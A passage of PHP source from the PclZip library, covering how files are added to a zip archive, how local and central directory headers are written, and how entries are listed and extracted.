    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    fclose($v_zip_temp_fd);
    $this->privCloseFd();
    @unlink($v_zip_temp_name);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        fclose($v_zip_temp_fd);
        $this->privCloseFd();
        @unlink($v_zip_temp_name);
        $this->privSwapBackMagicQuotes();

        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = $v_central_dir['comment'];
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
    $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  $this->privSwapBackMagicQuotes();

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privOpenFd($p_mode)
{
  $v_result=1;

  if ($this->zip_fd != 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

    return PclZip::errorCode();
  }

  if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

    return PclZip::errorCode();
  }

  return $v_result;
}

function privCloseFd()
{
  $v_result=1;

  if ($this->zip_fd != 0)
    @fclose($this->zip_fd);
  $this->zip_fd = 0;

  return $v_result;
}

function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = '';
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);

    return $v_result;
  }

  return $v_result;
}

function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_header = array();

  $v_nb = sizeof($p_result_list);

  for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
    $p_filedescr_list[$j]['filename']
    = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
    

    if ($p_filedescr_list[$j]['filename'] == "") {
      continue;
    }

    if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
        && (!file_exists($p_filedescr_list[$j]['filename']))) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exist");
      return PclZip::errorCode();
    }

    if (   ($p_filedescr_list[$j]['type'] == 'file')
        || ($p_filedescr_list[$j]['type'] == 'virtual_file')
        || (   ($p_filedescr_list[$j]['type'] == 'folder')
            && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
        ) {

      $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                     $p_options);
      if ($v_result != 1) {
        return $v_result;
      }

      $p_result_list[$v_nb++] = $v_header;
    }
  }

  return $v_result;
}

function privAddFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];

  if ($p_filename == "") {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

    return PclZip::errorCode();
  }


  clearstatcache();
  $p_header['version'] = 20;
  $p_header['version_extracted'] = 10;
  $p_header['flag'] = 0;
  $p_header['compression'] = 0;
  $p_header['crc'] = 0;
  $p_header['compressed_size'] = 0;
  $p_header['filename_len'] = strlen($p_filename);
  $p_header['extra_len'] = 0;
  $p_header['disk'] = 0;
  $p_header['internal'] = 0;
  $p_header['offset'] = 0;
  $p_header['filename'] = $p_filename;
  $p_header['stored_filename'] = $p_filedescr['stored_filename'];
  $p_header['extra'] = '';
  $p_header['status'] = 'ok';
  $p_header['index'] = -1;

  if ($p_filedescr['type']=='file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type']=='folder') {
    $p_header['external'] = 0x00000010;
    $p_header['mtime'] = filemtime($p_filename);
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = strlen($p_filedescr['content']);
  }
  

  if (isset($p_filedescr['mtime'])) {
    $p_header['mtime'] = $p_filedescr['mtime'];
  }
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['mtime'] = time();
  }
  else {
    $p_header['mtime'] = filemtime($p_filename);
  }

  if (isset($p_filedescr['comment'])) {
    $p_header['comment_len'] = strlen($p_filedescr['comment']);
    $p_header['comment'] = $p_filedescr['comment'];
  }
  else {
    $p_header['comment_len'] = 0;
    $p_header['comment'] = '';
  }

  if (isset($p_options[PCLZIP_CB_PRE_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);
    if ($v_result == 0) {
      $p_header['status'] = "skipped";
      $v_result = 1;
    }

    if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
      $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
    }
  }

  if ($p_header['stored_filename'] == "") {
    $p_header['status'] = "filtered";
  }
  
  if (strlen($p_header['stored_filename']) > 0xFF) {
    $p_header['status'] = 'filename_too_long';
  }

  if ($p_header['status'] == 'ok') {

    if ($p_filedescr['type'] == 'file') {
      if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
          && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
              || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                  && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_header['size'])) ) ) {
        $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);
        if ($v_result < PCLZIP_ERR_NO_ERROR) {
          return $v_result;
        }
      }
      
      else {

      if (($v_file = @fopen($p_filename, "rb")) == 0) {
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
        return PclZip::errorCode();
      }

      $v_content = @fread($v_file, $p_header['size']);

      @fclose($v_file);

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);

      }

    }

    else if ($p_filedescr['type'] == 'virtual_file') {
        
      $v_content = $p_filedescr['content'];

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
    }

    else if ($p_filedescr['type'] == 'folder') {
      if (@substr($p_header['stored_filename'], -1) != '/') {
        $p_header['stored_filename'] .= '/';
      }

      $p_header['size'] = 0;

      if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (isset($p_options[PCLZIP_CB_POST_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);
    if ($v_result == 0) {
      $v_result = 1;
    }

  }

  return $v_result;
}

function privAddFileUsingTempFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=PCLZIP_ERR_NO_ERROR;
  
  $p_filename = $p_filedescr['filename'];


  if (($v_file = @fopen($p_filename, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
    return PclZip::errorCode();
  }

  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_file_compressed = @gzopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }

  $v_size = filesize($p_filename);
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file, $v_read_size);
    @gzputs($v_file_compressed, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file);
  @gzclose($v_file_compressed);

  if (filesize($v_gzip_temp_name) < 18) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'gzip temporary file \''.$v_gzip_temp_name.'\' has invalid filesize - should be minimum 18 bytes');
    return PclZip::errorCode();
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  $v_binary_data = @fread($v_file_compressed, 10);
  $v_data_header = unpack('a1id1/a1id2/a1cm/a1flag/Vmtime/a1xfl/a1os', $v_binary_data);

  $v_data_header['os'] = bin2hex($v_data_header['os']);

  @fseek($v_file_compressed, filesize($v_gzip_temp_name)-8);
  $v_binary_data = @fread($v_file_compressed, 8);
  $v_data_footer = unpack('Vcrc/Vcompressed_size', $v_binary_data);

  $p_header['compression'] = ord($v_data_header['cm']);
  $p_header['crc'] = $v_data_footer['crc'];
  $p_header['compressed_size'] = filesize($v_gzip_temp_name)-18;

  @fclose($v_file_compressed);

  if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
    return $v_result;
  }

  if (($v_file_compressed = @fopen($v_gzip_temp_name, "rb")) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }

  fseek($v_file_compressed, 10);
  $v_size = $p_header['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_file_compressed, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  @fclose($v_file_compressed);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privCalculateStoredFilename(&$p_filedescr, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];
  if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
    $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
  }
  else {
    $p_add_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
    $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
  }
  else {
    $p_remove_dir = '';
  }
  if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
    $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
  }
  else {
    $p_remove_all_dir = 0;
  }


  if (isset($p_filedescr['new_full_name'])) {
    $v_stored_filename = PclZipUtilTranslateWinPath($p_filedescr['new_full_name']);
  }
  
  else {

    if (isset($p_filedescr['new_short_name'])) {
      $v_path_info = pathinfo($p_filename);
      $v_dir = '';
      if ($v_path_info['dirname'] != '') {
        $v_dir = $v_path_info['dirname'].'/';
      }
      $v_stored_filename = $v_dir.$p_filedescr['new_short_name'];
    }
    else {
      $v_stored_filename = $p_filename;
    }

    if ($p_remove_all_dir) {
      $v_stored_filename = basename($p_filename);
    }
    else if ($p_remove_dir != "") {
      if (substr($p_remove_dir, -1) != '/')
        $p_remove_dir .= "/";

      if (   (substr($p_filename, 0, 2) == "./")
          || (substr($p_remove_dir, 0, 2) == "./")) {
          
        if (   (substr($p_filename, 0, 2) == "./")
            && (substr($p_remove_dir, 0, 2) != "./")) {
          $p_remove_dir = "./".$p_remove_dir;
        }
        if (   (substr($p_filename, 0, 2) != "./")
            && (substr($p_remove_dir, 0, 2) == "./")) {
          $p_remove_dir = substr($p_remove_dir, 2);
        }
      }

      $v_compare = PclZipUtilPathInclusion($p_remove_dir,
                                           $v_stored_filename);
      if ($v_compare > 0) {
        if ($v_compare == 2) {
          $v_stored_filename = "";
        }
        else {
          $v_stored_filename = substr($v_stored_filename,
                                      strlen($p_remove_dir));
        }
      }
    }
    
    $v_stored_filename = PclZipUtilTranslateWinPath($v_stored_filename);
    
    if ($p_add_dir != "") {
      if (substr($p_add_dir, -1) == "/")
        $v_stored_filename = $p_add_dir.$v_stored_filename;
      else
        $v_stored_filename = $p_add_dir."/".$v_stored_filename;
    }
  }

  $v_stored_filename = PclZipUtilPathReduction($v_stored_filename);
  $p_filedescr['stored_filename'] = $v_stored_filename;
  
  return $v_result;
}

function privWriteFileHeader(&$p_header)
{
  $v_result=1;

  $p_header['offset'] = ftell($this->zip_fd);

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];

  $v_binary_data = pack("VvvvvvVVVvv", 0x04034b50,
                      $p_header['version_extracted'], $p_header['flag'],
                        $p_header['compression'], $v_mtime, $v_mdate,
                        $p_header['crc'], $p_header['compressed_size'],
					  $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len']);

  fputs($this->zip_fd, $v_binary_data, 30);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }

  return $v_result;
}

function privWriteCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_date = getdate($p_header['mtime']);
  $v_mtime = ($v_date['hours']<<11) + ($v_date['minutes']<<5) + $v_date['seconds']/2;
  $v_mdate = (($v_date['year']-1980)<<9) + ($v_date['mon']<<5) + $v_date['mday'];


  $v_binary_data = pack("VvvvvvvVVVvvvvvVV", 0x02014b50,
                      $p_header['version'], $p_header['version_extracted'],
                        $p_header['flag'], $p_header['compression'],
					  $v_mtime, $v_mdate, $p_header['crc'],
                        $p_header['compressed_size'], $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len'], $p_header['comment_len'],
                        $p_header['disk'], $p_header['internal'],
					  $p_header['external'], $p_header['offset']);

  fputs($this->zip_fd, $v_binary_data, 46);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }
  if ($p_header['comment_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
  }

  return $v_result;
}

function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
{
  $v_result=1;

  $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                      $p_nb_entries, $p_size,
					  $p_offset, strlen($p_comment));

  fputs($this->zip_fd, $v_binary_data, 22);

  if (strlen($p_comment) != 0)
  {
    fputs($this->zip_fd, $p_comment, strlen($p_comment));
  }

  return $v_result;
}

function privList(&$p_list)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
  {
    $this->privSwapBackMagicQuotes();
    
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

    return PclZip::errorCode();
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_central_dir['offset']))
  {
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  for ($i=0; $i<$v_central_dir['entries']; $i++)
  {
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_header['index'] = $i;

    $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
    unset($v_header);
  }

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privConvertHeader2FileInfo($p_header, &$p_info)
{
  $v_result=1;

  $v_temp_path = PclZipUtilPathReduction($p_header['filename']);
  $p_info['filename'] = $v_temp_path;
  $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);
  $p_info['stored_filename'] = $v_temp_path;
  $p_info['size'] = $p_header['size'];
  $p_info['compressed_size'] = $p_header['compressed_size'];
  $p_info['mtime'] = $p_header['mtime'];
  $p_info['comment'] = $p_header['comment'];
  $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
  $p_info['index'] = $p_header['index'];
  $p_info['status'] = $p_header['status'];
  $p_info['crc'] = $p_header['crc'];

  return $v_result;
}

function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (   ($p_path == "")
    || (   (substr($p_path, 0, 1) != "/")
	    && (substr($p_path, 0, 3) != "../")
		&& (substr($p_path,1,2)!=":/")))
    $p_path = "./".$p_path;

  if (($p_path != "./") && ($p_path != "/"))
  {
    while (substr($p_path, -1) == "/")
    {
      $p_path = substr($p_path, 0, strlen($p_path)-1);
    }
  }

  if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
  {
    $p_remove_path .= '/';
  }
  $p_remove_path_size = strlen($p_remove_path);

  if (($v_result = $this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_pos_entry = $v_central_dir['offset'];

  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    @rewind($this->zip_fd);
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      return PclZip::errorCode();
    }

    $v_header = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      return $v_result;
    }

    $v_header['index'] = $i;

    $v_pos_entry = ftell($this->zip_fd);

    $v_extract = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_extract = true;
                }
            }
            elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_extract = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
            $v_extract = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
        
        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_extract = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }

    else {
        $v_extract = true;
    }

  if (   ($v_extract)
      && (   ($v_header['compression'] != 8)
	      && ($v_header['compression'] != 0))) {
        $v_header['status'] = 'unsupported_compression';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();
            
            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
		                       "Filename '".$v_header['stored_filename']."' is "
			  	    	  	   ."compressed by an unsupported compression "
			  	    	  	   ."method (".$v_header['compression'].") ");

            return PclZip::errorCode();
	  }
  }
  
  if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
        $v_header['status'] = 'unsupported_encryption';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();

            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
		                       "Unsupported encryption for "
			  	    	  	   ." filename '".$v_header['stored_filename']
							   ."'");

            return PclZip::errorCode();
	  }
  }

    if (($v_extract) && ($v_header['status'] != 'ok')) {
        $v_result = $this->privConvertHeader2FileInfo($v_header,
	                                        $p_file_list[$v_nb_extracted++]);
        if ($v_result != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
        }

        $v_extract = false;
    }
    
    if ($v_extract)
    {

      @rewind($this->zip_fd);
      if (@fseek($this->zip_fd, $v_header['offset']))
      {
        $this->privCloseFd();

        $this->privSwapBackMagicQuotes();

        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        return PclZip::errorCode();
      }

      if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

        $v_string = '';

        $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        $p_file_list[$v_nb_extracted]['content'] = $v_string;

        $v_nb_extracted++;
        
        if ($v_result1 == 2) {
        	break;
        }
      }
      elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
	        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
        $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
      else {
        $v_result1 = $this->privExtractFile($v_header,
	                                      $p_path, $p_remove_path,
										  $p_remove_all_path,
										  $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
    }
  }

  $this->privCloseFd();
  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if ($p_remove_all_path == true) {
      if (($p_entry['external']&0x00000010)==0x00000010) {

          $p_entry['status'] = "filtered";

          return $v_result;
      }

      $p_entry['filename'] = basename($p_entry['filename']);
  }

  else if ($p_remove_path != "")
  {
    if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
    {

      $p_entry['status'] = "filtered";

      return $v_result;
    }

    $p_remove_path_size = strlen($p_remove_path);
    if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
    {

      $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

    }
  }

  if ($p_path != '') {
    $p_entry['filename'] = $p_path."/".$p_entry['filename'];
  }
  
  if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
    $v_inclusion
    = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                              $p_entry['filename']); 
    if ($v_inclusion == 0) {

      PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
		                     "Filename '".$p_entry['filename']."' is "
							 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

      return PclZip::errorCode();
    }
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

  if (file_exists($p_entry['filename']))
  {

    if (is_dir($p_entry['filename']))
    {

      $p_entry['status'] = "already_a_directory";
      
      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

